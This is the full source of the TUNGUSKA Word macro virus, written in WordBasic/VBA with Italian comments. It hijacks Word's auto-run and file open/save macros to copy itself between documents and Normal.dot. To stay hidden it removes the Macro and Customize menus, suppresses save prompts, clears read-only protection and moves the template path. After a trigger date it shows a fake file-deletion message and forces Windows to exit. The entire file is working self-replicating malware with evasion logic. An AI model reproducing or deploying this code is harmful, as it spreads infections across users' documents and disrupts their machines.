   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "GuidaInformazioni"

   '------------------------------------------------------------------------
   ' Virus: TUNGUSKA
   '------------------------------------------------------------------------
   ' Variabile in Winword6.ini:
   '    CheckCRC$       : se = 1, il virus NON infetta il MIO computer
   '    Debug$          : se = 1, visualizzo i messaggi di Debug
   '    DictionaryHelp$ : se = 1, è scattata una certa data
   '------------------------------------------------------------------------
   '   MACRO Italiane      MACRO Inglesi       COMMENTO
   '------------------------------------------------------------------------
   '   AutoClose           AutoClose           intercetta doppio-click
   '   AutoExec            AutoExec            intercetta avvio Word
   '   AutoOpen            AutoOpen            intercetta apertura file
   '   FileApri            FileOpen            intercetta Dialogo Apri
   ' * FileChiudiOChiudiT. FileClose           intercetta chiusura file
   '   FileSalva           FileSave            intercetta salva file
   '   FileSalvaConNome    FileSaveAs          intercetta Dialogo SalvaConNome
   ' * FileModelli         Templates           intercetta Dialogo Modelli
   '   GuidaInformazioni   GuidaInformazioni       virus
   '   GuidaSupporto       GuidaSupporto       per controllo presenza virus
   '------------------------------------------------------------------------

   ' variabili globali
   Dim CheckCRC$, Debug_$, FileProvvisorio, _
               Documento$, HasMacro$, FileIni$, Sezione$, _
               UserDotPath$, NormalDot$, OldDirUserDot$

   '------------------------------------------------------------------------
   ' routine principale
   '------------------------------------------------------------------------
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.AutoClose.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.GuidaInformazioni.MAIN"
   CheckCRC$ = ""
   Debug_$ = ""
   FileProvvisorio = 0
   Documento$ = ""
   HasMacro$ = ""
   FileIni$ = ""
   Sezione$ = ""
   UserDotPath$ = ""
   NormalDot$ = ""
   OldDirUserDot$ = ""
       On Error GoTo -1: On Error GoTo Fine

       WordBasic.DisableInput 1                    ' disabilita ESC per annullare una macro
       InitGlobalVars                  ' inizializza variabili globali
       If MioComputer Then             ' controllo che NON sia il mio computer
           MsgPortatore                ' avvisa del tentativo di infezione
       Else
           If Not FileProvvisorio Then     ' file già salvato almeno 1 volta
               Strategia               ' routine di gestione
           End If
       End If
       WordBasic.DisableInput 0                    ' abilita ESC per annullare una macro

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che gestisce se infettare Normal.dot o il Documento.
   ' se già presente il virus, controlla la versione
   '------------------------------------------------------------------------
   Private Sub Strategia()
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub Strategia"

       OpzioniSalva    ' modifico dei default in StrumOpzioniSalva

       If HasMacro$ = "NORMAL.DOT" Then
           MsgDebug "Normal.Dot in esecuzione"

           If Not EsisteDummyMacro(1) Then         ' modello NON infettato
               InfettaDocumento
           Else
               InfettaDocumentoCheckVersione
           End If
       Else
           MsgDebug "Documento in esecuzione"

           If Not EsisteDummyMacro(0) Then         ' Normal.dot NON infettato
               InfettaNormalDot
           Else
               InfettaNormalDotCheckVersione
           End If
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che infetta Normal.Dot, solo se NON è protetto.
   ' la UserDotPath va sempre cambiata, perchè se Normal.Dot è protetto,
   ' lo posso infettare la volta successiva
   '------------------------------------------------------------------------
   Private Sub InfettaNormalDot()
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub InfettaNormalDot"

       If NormalDotEsiste Then                 ' se il file ESISTE
           If Not NormalDotProtetto Then       ' se NON è protetto
               If NormalDotInUso Then          ' se è in uso
                   EliminaTutteLeMacro (0)     ' elimina le macro Normal.dot
                   CopiaTutteLeMacro (0)       ' copia le macro del virus
                   RimuoviMenu                 ' rimuove alcuni menu
                   MsgDebug "FileSalvaTutto"
                   WordBasic.FileSaveAll 1, 1          ' salva NORMAL.DOT e Documento
               End If
           End If
       End If

       CambiaUserDotPath                       ' cambia la UserDotPath

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' infetta Normal.Dot solo se la versione del documento è maggiore
   '------------------------------------------------------------------------
   Private Sub InfettaNormalDotCheckVersione()
   Dim VersNormal$
   Dim VersDoc$
   Dim Msg$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub InfettaNormalDotCheckVersione"

       VersNormal$ = Normalizza$(Versione$(0)) ' versione virus di Normal.Dot
       VersDoc$ = Normalizza$(Versione$(1))        ' versione virus del Documento

       Msg$ = "Normal.dot GIA' infettato." + Chr(13) + _
              "VersioneDocumento: " + VersDoc$ + Chr(13) + _
              "VersioneNormal: " + VersNormal$ + Chr(13)

       If WordBasic.Val(VersDoc$) > WordBasic.Val(VersNormal$) Then
           MsgDebug Msg$ + "Copia virus."
           InfettaNormalDot
       Else
           MsgDebug Msg$ + "NON Copia virus."
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che infetta il documento, solo se NON è protetto
   '------------------------------------------------------------------------
   Private Sub InfettaDocumento()
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub InfettaDocumento"

       ' NON infetto perchè rallenta l'I/O e potrebbe insospettire
       If FileSuFloppy Then
           MsgDebug "Documento su floppy"
           GoTo Fine
       End If

       Dim dlgSOS As Object: Set dlgSOS = WordBasic.DialogRecord.ToolsOptionsSave(False)
       WordBasic.CurValues.ToolsOptionsSave dlgSOS
       MsgDebug "PasswordScrittura: " + dlgSOS.WritePassword

       If dlgSOS.WritePassword <> "" Then
           ' NON scrivo per evitare un messaggio sospetto quando esco con FileSalva
           MsgDebug "Documento PROTETTO"
       Else
           MsgDebug "Documento modificabile"

           SalvaComeModello                ' salva un Documento come Modello
           EliminaTutteLeMacro (1)         ' elimina le macro utente
           CopiaTutteLeMacro (1)           ' copia le macro del virus
           RimuoviMenu                     ' rimuove alcuni menu
           MsgDebug "FileSalva"
           WordBasic.FileSave                      ' salva il modello infettato
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' infetta il documento solo se la versione del Normal.Dot è maggiore
   '------------------------------------------------------------------------
   Private Sub InfettaDocumentoCheckVersione()
   Dim VersNormal$
   Dim VersDoc$
   Dim Msg$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub InfettaDocumentoCheckVersione"

       VersNormal$ = Normalizza$(Versione$(0)) ' versione virus di Normal.Dot
       VersDoc$ = Normalizza$(Versione$(1))        ' versione virus del Documento

       Msg$ = "Documento GIA' infettato." + Chr(13) + _
              "VersioneDocumento: " + VersDoc$ + Chr(13) + _
              "VersioneNormal: " + VersNormal$ + Chr(13)

       If WordBasic.Val(VersNormal$) > WordBasic.Val(VersDoc$) Then
           MsgDebug Msg$ + "Copia virus."
           InfettaDocumento
       Else
           MsgDebug Msg$ + "NON Copia virus."
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' ritorna -1 se Normal.Dot esiste, altrimenti 0
   '------------------------------------------------------------------------
   Private Function NormalDotEsiste()
   Dim OldFile$
       On Error GoTo -1: On Error GoTo Fine

       ' mette automaticamente la "\" dopo la path
       OldFile$ = WordBasic.[FileNameInfo$](OldDirUserDot$, 5) + NormalDot$

       MsgDebug "Sub NormalDotEsiste: " + OldFile$

       ' verifica che Normal.Dot è un file esistente
       If WordBasic.[Files$](OldFile$) <> "" Then
           MsgDebug "Normal.Dot esiste"
           NormalDotEsiste = -1
       Else
           MsgDebug "Normal.Dot NON esiste !"
           NormalDotEsiste = 0
       End If

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' ritorna -1 se Normal.Dot è in lettura (DOS), altrimenti 0
   '------------------------------------------------------------------------
   Private Function NormalDotProtetto()
   Dim OldFile$
       On Error GoTo -1: On Error GoTo Fine

       ' mette automaticamente la "\" dopo la path
       OldFile$ = WordBasic.[FileNameInfo$](OldDirUserDot$, 5) + NormalDot$

       MsgDebug "Sub NormalDotProtetto: " + OldFile$

       If (GetAttr(OldFile$) Mod 2) = 1 Then
           MsgDebug "Normal.Dot è PROTETTO !"
           NormalDotProtetto = -1
       Else
           MsgDebug "Normal.Dot NON è protetto"
           NormalDotProtetto = 0
       End If

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' ritorna -1 se Normal.Dot è in uso, altrimenti 0
   '------------------------------------------------------------------------
   Private Function NormalDotInUso()
   Dim OldFile$
       On Error GoTo -1: On Error GoTo Fine

       ' mette automaticamente la "\" dopo la path
       OldFile$ = WordBasic.[FileNameInfo$](OldDirUserDot$, 5) + NormalDot$

       MsgDebug "Sub NormalDotInUso: " + OldFile$

       On Error GoTo -1: On Error GoTo In_Uso
       Open OldFile$ For Input As 1
       Close 1
       NormalDotInUso = 0
       MsgDebug "Normal.Dot NON è in uso"
       GoTo Fine
   In_Uso:
       NormalDotInUso = -1
       MsgDebug "Normal.Dot è IN USO !"

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' ritorna (-1) se il documento è su floppy, altrimenti (0)
   '------------------------------------------------------------------------
   Private Function FileSuFloppy()
   Dim Disco$
       On Error GoTo -1: On Error GoTo Fine

       Disco$ = UCase(WordBasic.[Left$](WordBasic.[FileNameInfo$](Documento$, 5), 2))
       If Disco$ = "A:" Or Disco$ = "B:" Then
           FileSuFloppy = -1
       Else
           FileSuFloppy = 0
       End If

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' routine che salva un Documento in formato Modello
   '------------------------------------------------------------------------
   Private Sub SalvaComeModello()
   Dim Modello
       On Error GoTo -1: On Error GoTo Fine

       Modello = 1

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg      ' leggo i valori dal dialogo

       ' se NON è un modello
       If dlg.Format <> Modello Then
           ' salva come Modello per poter eseguire CopiaMacro
           MsgDebug "File salvato come Modello"
           WordBasic.FileSaveAs Format:=Modello
       Else
           MsgDebug "Il file è già un Modello"
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che imposta le opzioni del Dialogo Strumenti..Opzioni..Salva
   '   imposto salvataggio veloce per non insospettire quando salvo il documento
   '   permette di salvare Normal.dot senza richiedere conferma
   '------------------------------------------------------------------------
   Private Sub OpzioniSalva()
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "StrumOpzioniSalvaVeloce"

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsOptionsSave(False)
       WordBasic.CurValues.ToolsOptionsSave dlg    ' leggo i valori dal dialogo

       ' se NON sono impostati, allora effettuo la modifica
       If dlg.FastSaves <> 1 Or dlg.GlobalDotPrompt <> 0 Then
           WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' copia le macro da Normal.dot al Documento (1), o viceversa (0)
   '------------------------------------------------------------------------
   Private Sub CopiaTutteLeMacro(Direzione)
   Dim Protetta
   Dim Elementi
   Dim j
       On Error GoTo -1: On Error GoTo Fine

       Protetta = 1    ' 1=PROTETTA, 0=modificabile
       Elementi = 7
       ReDim Elemento__$(Elementi)
       Elemento__$(0) = "AutoClose"
       Elemento__$(1) = "AutoExec"
       Elemento__$(2) = "AutoOpen"
       Elemento__$(3) = "FileApri"
       Elemento__$(4) = "FileSalva"
       Elemento__$(5) = "FileSalvaConNome"
       Elemento__$(6) = "GuidaInformazioni"
       Elemento__$(7) = "GuidaSupporto"
           'Elemento$(8) = "FileChiudiOChiudiTutto"

       If Direzione Then
           MsgDebug "CopieTutteLeMacro da Normal a Documento"
           For j = 0 To Elementi
               WordBasic.MacroCopy "Normal.dot:" + Elemento__$(j), _
                           Documento$ + ":" + Elemento__$(j), _
                           Protetta
           Next
       Else
           MsgDebug "CopieTutteLeMacro da Documento a Normal"
           For j = 0 To Elementi
               WordBasic.MacroCopy Documento$ + ":" + Elemento__$(j), _
                          "Normal.dot:" + Elemento__$(j), _
                           Protetta
           Next
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' elimina le macro in Normal.dot (0) o nel Documento (1)
   '------------------------------------------------------------------------
   Private Sub EliminaTutteLeMacro(Direzione)
   Dim Normal
   Dim Documento_
   Dim NumeroMacro
   Dim Conta
       On Error GoTo -1: On Error GoTo Fine

       Normal = 0
       Documento_ = 1

       If Direzione Then
           MsgDebug "EliminaTutteLeMacro da Documento"
           NumeroMacro = WordBasic.CountMacros(Documento_)
           For Conta = NumeroMacro To 1 Step -1
               WordBasic.ToolsMacro Show:=3, _
                   Name:=WordBasic.[MacroName$](Conta, Documento_), Delete:=1
           Next
       Else
           MsgDebug "EliminaTutteLeMacro da Normal"
           NumeroMacro = WordBasic.CountMacros(Normal)
           For Conta = NumeroMacro To 1 Step -1
               WordBasic.ToolsMacro Show:=1, _
                   Name:=WordBasic.[MacroName$](Conta, Normal), Delete:=1
           Next
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' ritorna -1 se esiste, altrimenti 0. Contesto: 0=Normal, 1=Documento
   '------------------------------------------------------------------------
   Private Function EsisteDummyMacro(Contesto)
   Dim DummyMacro$
   Dim NumeroMacro
   Dim MacroNormal$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Function EsisteDummyMacro"

       DummyMacro$ = "GuidaSupporto"
       EsisteDummyMacro = 0

       NumeroMacro = WordBasic.CountMacros(Contesto)
       MsgDebug "NumeroMacro presenti: " + Str(NumeroMacro)

       While NumeroMacro   ' finchè ce ne sono
           MacroNormal$ = WordBasic.[MacroName$](NumeroMacro, Contesto)
           If UCase(DummyMacro$) = UCase(MacroNormal$) Then
               MsgDebug "DummyMacro trovata"
               EsisteDummyMacro = -1
               GoTo Fine
           End If
           NumeroMacro = NumeroMacro - 1
       Wend

       MsgDebug "DummyMacro NON trovata"

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' routine che rimuove le entrate di alcuni menu, se NON già rimossi
   '------------------------------------------------------------------------
   Private Sub RimuoviMenu()
   Dim DocAperto
   Dim DocChiuso
   Dim ModNormal
   Dim ModAttivo
   Dim n
   Dim MenuItem$
   Dim Item$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub RimuoviMenu"

       DocAperto = 0
       DocChiuso = 1
       ModNormal = 0
       ModAttivo = 1

   Rimuovi_1:
       ' rimuove menu "Macro...", se presente
       For n = 1 To WordBasic.CountMenuItems("Strumenti", DocAperto, ModNormal)
           MenuItem$ = WordBasic.[MenuItemMacro$]("Strumenti", DocAperto, n, ModNormal)
           If MenuItem$ = "StrumMacro" Then
               WordBasic.ToolsCustomizeMenus Menu:="Strumenti", Name:="StrumMacro", _
                   MenuType:=DocAperto, Context:=ModNormal, Remove:=1
               'MsgDebug("Macro... DocAperto")
               GoTo Rimuovi_2
           End If
       Next

   Rimuovi_2:
       ' rimuove menu "Personalizza...", se presente
       For n = 1 To WordBasic.CountMenuItems("Strumenti", DocAperto, ModNormal)
           MenuItem$ = WordBasic.[MenuItemMacro$]("Strumenti", DocAperto, n, ModNormal)
           If MenuItem$ = "StrumPersonalizza" Then
               WordBasic.ToolsCustomizeMenus Menu:="Strumenti", _
                   Name:="StrumPersonalizza", _
                   MenuType:=DocAperto, Context:=ModNormal, Remove:=1
               'MsgDebug("Personalizza... DocAperto")
               GoTo Rimuovi_3
           End If
       Next

   Rimuovi_3:
       ' rimuove menu "Macro...", se presente
       For n = 1 To WordBasic.CountMenuItems("File", DocChiuso, ModNormal)
           MenuItem$ = WordBasic.[MenuItemMacro$]("File", DocChiuso, n, ModNormal)
           If MenuItem$ = "StrumMacro" Then
               WordBasic.ToolsCustomizeMenus Menu:="File", Name:="StrumMacro", _
                   MenuType:=DocChiuso, Context:=ModNormal, Remove:=1
               'MsgDebug("Macro... DocChiuso")
               GoTo Rimuovi_4
           End If
       Next

   Rimuovi_4:
       ' rimuove il primo "(Separatore)"
       For n = 1 To WordBasic.CountMenuItems("File", DocChiuso, ModNormal)
           Item$ = WordBasic.[MenuItemText$]("File", DocChiuso, n, ModNormal)
           If WordBasic.[Left$](Item$, 4) = "(Sep" Then
               WordBasic.ToolsCustomizeMenus Menu:="File", Name:=Item$, _
                   MenuType:=DocChiuso, Context:=ModNormal, Remove:=1
               'MsgDebug("(Separatore)...DocChiuso")
               GoTo Fine
       End If
       Next

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' cambia la User-Dot-Path dei modelli e gli forza la Doc-Path per:
   '   far sì che SalvaConNome punti sempre alla Doc-Path
   '   Normal.Dot (infettato) sia potenzialmente nascosto
   '   toglie l'eventuale attributo di sola lettura del nuovo Normal.Dot
   '------------------------------------------------------------------------
   Private Sub CambiaUserDotPath()
   Dim DocPath$
   Dim NewDirUserDot$
   Dim OldFile$
   Dim NewFile$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub CambiaUserDotPath"

       DocPath$ = "DOC-PATH"

       ' leggo la Doc-Path
       NewDirUserDot$ = WordBasic.[GetPrivateProfileString$](Sezione$, DocPath$, FileIni$)

       If UCase(OldDirUserDot$) <> UCase(NewDirUserDot$) Then
           MsgDebug UserDotPath$ + " originale. Da spostare"

           If NormalDotEsiste Then         ' se il file ESISTE
               ' crea nome file
               OldFile$ = WordBasic.[FileNameInfo$](OldDirUserDot$, 5) + NormalDot$

               ' copio il file originale nella nuova directory
               MsgDebug "CopiaFile: " + OldFile$ + "  in: " + NewDirUserDot$
               WordBasic.CopyFile FileName:=OldFile$, Directory:=NewDirUserDot$

               ' imposto la nuova directory di default
               WordBasic.SetPrivateProfileString Sezione$, UserDotPath$, _
                                       UCase(NewDirUserDot$), FileIni$
               MsgDebug UserDotPath$ + " cambiata"

               ' toglie al nuovo Normal.Dot qualsiasi attributo di file
               NewFile$ = WordBasic.[FileNameInfo$](NewDirUserDot$, 5) + NormalDot$
               SetAttr NewFile$, 0
               MsgDebug "Attributi di file azzerati"
           Else
               MsgDebug "Normal.Dot NON esiste. NESSUN cambiamento."
           End If
       Else
           MsgDebug UserDotPath$ + " già spostata precedentemente"
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che inizializza le variabili globali
   '------------------------------------------------------------------------
   Private Sub InitGlobalVars()
   Dim DocName$
       On Error GoTo -1: On Error GoTo Fine

       Sezione$ = "Microsoft Word"
       FileIni$ = "Winword6.Ini"
       UserDotPath$ = "USER-DOT-PATH"
       NormalDot$ = "NORMAL.DOT"

       ' leggo le variabili dal file.INI
       CheckCRC$ = WordBasic.[GetPrivateProfileString$](Sezione$, "CheckCRC", FileIni$)
       Debug_$ = WordBasic.[GetPrivateProfileString$](Sezione$, "Debug", FileIni$)
       OldDirUserDot$ = WordBasic.[GetPrivateProfileString$](Sezione$, UserDotPath$, FileIni$)

       MsgDebug "Sub InitGlobalVars"

       DocName$ = WordBasic.[SelectionFileName$]()     ' leggo il nome del file
       If WordBasic.[Right$](DocName$, 1) = "\" Then   ' file provvisorio, MAI salvato
           MsgDebug "File Provvisorio"
           FileProvvisorio = -1
       Else
           MsgDebug "File NON Provvisorio"
           FileProvvisorio = 0

           ' imposta NomeFile
           Documento$ = WordBasic.[FileNameInfo$](DocName$, 3)

           ' determina a chi appartiene la macro in esecuzione
           HasMacro$ = WordBasic.[FileNameInfo$](WordBasic.[MacroFileName$](), 3)
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che avverte della presenza del virus
   '------------------------------------------------------------------------
   Private Sub MsgPortatore()
   Dim Portatore$
   Dim Titolo$
   Dim FlagMsg
   Dim Messaggio$
       On Error GoTo -1: On Error GoTo Fine

       MsgDebug "Sub MsgPortatore"

       Portatore$ = "  è  portatore  del  virus  TUNGUSKA."
       Titolo$ = "ATTENZIONE"
       FlagMsg = 48

       If HasMacro$ = "NORMAL.DOT" Then
           Messaggio$ = HasMacro$
       Else
           Messaggio$ = Documento$
       End If

       Messaggio$ = Messaggio$ + Portatore$
       WordBasic.MsgBox Messaggio$, Titolo$, FlagMsg

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che visualizza il messaggio del virus, ed esce da Windows
   '------------------------------------------------------------------------
   Private Sub ControllaData()
   Dim MsgVirus$
   Dim Titolo$
   Dim FlagMsg
   Dim DataVirus$
   Dim Opzione$
   Dim DictionaryHelp$
   Dim n
       On Error GoTo -1: On Error GoTo Fine

       MsgVirus$ = "Il  virus  TUNGUSKA  ha  infettato  il  tuo  computer  !"
       Titolo$ = "ATTENZIONE"
       FlagMsg = 48
       DataVirus$ = "31/12/97"
       Sezione$ = "Microsoft Word"
       FileIni$ = "Winword6.Ini"
       Opzione$ = "DictionaryHelp"

       ' leggo la variabili dal file.INI
       DictionaryHelp$ = WordBasic.[GetPrivateProfileString$](Sezione$, Opzione$, FileIni$)

       ' se è trascorsa una certa data o se è presente un flag nel file.ini
       If WordBasic.Today() > WordBasic.DateValue(DataVirus$) Or DictionaryHelp$ = "1" Then

           ' scrivo la variabile solo la PRIMA volta
           If DictionaryHelp$ <> "1" Then
               WordBasic.SetPrivateProfileString Sezione$, Opzione$, "1", FileIni$
           End If

           For n = 1 To 3: WordBasic.Beep: Next        ' suona
           WordBasic.MsgBox MsgVirus$, Titolo$, FlagMsg    ' messaggio
           If DictionaryHelp$ <> "1" Then
               FintaCancellazione              ' solo la PRIMA volta
           End If
           WordBasic.ExitWindows                           ' esce da Windows
           'FileEsci 2                         ' esce da Word
       End If

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che esegue una finta cancellazione
   '------------------------------------------------------------------------
   Private Sub FintaCancellazione()
   Dim Messaggio$
   Dim Titolo$
   Dim FlagMsg
   Dim FileDelete$
   Dim n
       On Error GoTo -1: On Error GoTo Fine

       Messaggio$ = "Ho cancellato  200  files." + Chr(13) + _
                    "Tranquillo, è stato uno scherzo ... per ora !"
       Titolo$ = "ATTENZIONE"
       FlagMsg = 48
       FileDelete$ = "c:\hjk.xyz"

       WordBasic.DisableInput 1            ' disabilita ESC per NON interrompere macro
       For n = 1 To 100
           ScriviPerFintaCancellazione (FileDelete$)
       Next
       WordBasic.Kill FileDelete$      ' cancello ogni traccia
       WordBasic.MsgBox Messaggio$, Titolo$, FlagMsg
       WordBasic.DisableInput 0            ' abilita ESC

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che scrive un file per finta cancellazione
   '------------------------------------------------------------------------
   Private Sub ScriviPerFintaCancellazione(FileDelete$)
       On Error GoTo -1: On Error GoTo Fine

       Open FileDelete$ For Output As 1
       Write #1, "hjkwxyz"
       Close 1

   Fine:
   End Sub
   '------------------------------------------------------------------------
   ' routine che mostra un messaggio, solamente se Debug$ = 1
   '------------------------------------------------------------------------
   Private Sub MsgDebug(Messaggio$)
       If Debug_$ = "1" Then
           WordBasic.MsgBox Messaggio$, "DEBUG", 64
       End If
   End Sub
   '------------------------------------------------------------------------
   ' ritorna -1 se è il MIO computer, altrimenti 0
   '------------------------------------------------------------------------
   Private Function MioComputer()
       If CheckCRC$ = "1" Then
           MioComputer = -1
       Else
           MioComputer = 0
       End If
   End Function
   '------------------------------------------------------------------------
   ' esegue GuidaSupporto di: Normal.dot (0), del Documento (1)
   ' legge la versione nel correttore automatico, la cancella e la ritorna
   '------------------------------------------------------------------------
   Private Function Versione$(Direzione)
   Dim Contesto
   Dim Opzione$
   Dim Vers$
       On Error GoTo -1: On Error GoTo Fine

       If Direzione Then
           Contesto = 3    ' Documento
       Else
           Contesto = 1    ' Normal
       End If

       ' esegue la macro
       WordBasic.ToolsMacro Name:="GuidaSupporto", Show:=Contesto, Run:=1

       Opzione$ = "Versione"

       ' legge la versione
       Vers$ = WordBasic.[GetAutoCorrect$](Opzione$)

       If Vers$ <> "" Then     ' versione impostata correttamente
           ' cancella la versione dal correttore automatico
           WordBasic.ToolsAutoCorrect Delete:=1, Replace:=Opzione$
       End If

       Versione$ = Vers$

   Fine:
   End Function
   '------------------------------------------------------------------------
   ' normalizza la versione togliendo il punto. ( da: "1.0"  in: "1" )
   '------------------------------------------------------------------------
   Private Function Normalizza$(Vers$)
       If InStr(Vers$, ".") > 0 Then
           Normalizza$ = WordBasic.[Left$](Vers$, 1)
       Else
           Normalizza$ = Vers$
       End If
   End Function
   '------------------------------------------------------------------------


   Attribute VB_Name = "FileSalvaConNome"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Salva una copia del documento in un file diverso."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSalvaConNome.MAIN"
       'MsgBox "FileSalvaConNome"
       On Error GoTo -1: On Error GoTo Fine
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       WordBasic.Dialog.FileSaveAs dlg
       WordBasic.FileSaveAs dlg
       'MsgBox "Esegue: GuidaInformazioni"
       WordBasic.Call "GuidaInformazioni"
   Fine:
   End Sub

   Attribute VB_Name = "GuidaSupporto"

   '-------------------------------------------------------------------------
   ' macro usata per verificare la presenza del virus
   ' imposta la VERSIONE del virus nel correttore automatico
   '-------------------------------------------------------------------------
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.FileSalva.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.GuidaSupporto.MAIN"
       WordBasic.ToolsAutoCorrect Add:=1, Replace:="Versione", With:="3"
   End Sub
   '-------------------------------------------------------------------------

   Attribute VB_Name = "FileSalva"

   Public Sub MAIN()
       'MsgBox "FileSalva."
       On Error GoTo -1: On Error GoTo Fine
       WordBasic.FileSave
       'MsgBox "Esegue: GuidaInformazioni"
       WordBasic.Call "GuidaInformazioni"
   Fine:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
       'MsgBox "AutoClose:GuidaInformazioni"
       WordBasic.Call "GuidaInformazioni"
   End Sub

   Attribute VB_Name = "FileApri"

   '-------------------------------------------------------------------------
   ' intercetta il Dialogo FileApri per:
   '   togliere l'eventuale attributo di sola lettura (DOS)
   '   togliere l'eventuale attributo di sola lettura (WORD)
   '   disabilitare le macro automatiche
   '-------------------------------------------------------------------------
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Apre un documento od un modello esistente."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileApri.MAIN"
       'MsgBox "FileApri"
       On Error GoTo -1: On Error GoTo Fine

       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
       WordBasic.CurValues.FileOpen dlg
       WordBasic.Dialog.FileOpen dlg       ' leggo il nome del file

       ' tolgo l'attributo di sola lettura (DOS), se presente
       If (GetAttr(dlg.Name) Mod 2) = 1 Then
           SetAttr dlg.Name, 0
       End If

       ' tolgo l'attributo di sola lettura (WORD), se presente
       If dlg.ReadOnly = 1 Then
           dlg.ReadOnly = 0
       End If

       WordBasic.DisableAutoMacros 1       ' disabilita AutoOpen di un altro virus !
       WordBasic.FileOpen dlg
       WordBasic.DisableAutoMacros 0       ' abilita
       'MsgBox "Esegui: GuidaInformazioni"
       WordBasic.Call "GuidaInformazioni"
   Fine:
   End Sub
   '-------------------------------------------------------------------------

   Attribute VB_Name = "AutoOpen"

   '-------------------------------------------------------------------------
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.FileSalvaConNome.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
       'MsgBox "AutoOpen. Esegue: ScriviIterazioni"
       ScriviIterazioni

       'MsgBox "AutoOpen. Esegue: GuidaInformazioni"
       WordBasic.Call "GuidaInformazioni"
   End Sub
   '-------------------------------------------------------------------------
   ' crea un file con un numero progressivo sul disco M:\ ( se esiste )
   '-------------------------------------------------------------------------
   Private Sub ScriviIterazioni()
   Dim Archivio$
   Dim Stringa$
   Dim Dummy$
   Dummy$ = Space(255)
   Dim Iterazioni
       Archivio$ = "m:\iterator.txt"
       Stringa$ = "Iterazioni effettuate"

       On Error GoTo -1: On Error GoTo Error_Input

       ' se il disco "M:\" non esiste, esco
       If WordBasic.CountDirectories("M:\") = -1 Then GoTo Error_Output

       Open Archivio$ For Input As 1
       Input #1, Dummy$, Iterazioni
       Close 1
       GoTo OK_Input

   Error_Input:
       Err.Number = 0      ' inizializzo per intercettare successivo On Error ...
       Iterazioni = 0

   OK_Input:
       Iterazioni = Iterazioni + 1

       On Error GoTo -1: On Error GoTo Error_Output

       Open Archivio$ For Output As 1      ' può dare errore se disco protetto
       Write #1, Stringa$, Iterazioni
       Close 1

   Error_Output:
   End Sub
   '-------------------------------------------------------------------------

   Attribute VB_Name = "AutoExec"

   '------------------------------------------------------------------------
   ' routine che viene eseguita da una certa data in poi
   '------------------------------------------------------------------------
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.GuidaInformazioni.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
       WordBasic.Call "GuidaInformazioni.ControllaData"
   End Sub
   '------------------------------------------------------------------------
